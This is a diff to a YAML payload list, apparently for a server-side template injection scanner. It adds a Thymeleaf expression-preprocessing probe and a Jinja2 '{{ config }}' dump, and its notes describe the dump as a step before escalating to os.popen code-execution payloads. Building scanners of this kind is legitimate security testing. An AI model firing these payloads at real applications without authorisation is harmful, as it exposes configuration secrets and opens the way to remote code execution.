@@ -35,6 +35,14 @@ payloads:
     template: '{{ "{canary}" | upper }}'
     confidence: confirmed
     notes: Reflects {canary} uppercased; confirms execution without sensitive sinks.
+  - id: thymeleaf_fragment_preprocess
+    template: "__${7*7}__"
+    confidence: likely
+    notes: Thymeleaf expression-preprocessing fingerprint (CVE-2017-1320x family); fragment double-underscore syntax evaluates before the normal *{...} expression path.
+  - id: jinja_config_dump
+    template: "{{ config }}"
+    confidence: suspected
+    notes: Non-destructive Jinja2/Flask config-object dump; confirms an RCE-capable engine context before escalating to os.popen class-walker payloads.
 mutations:
   - name: whitespace_alt
     description: Template engines accept varying whitespace; tests parser robustness.
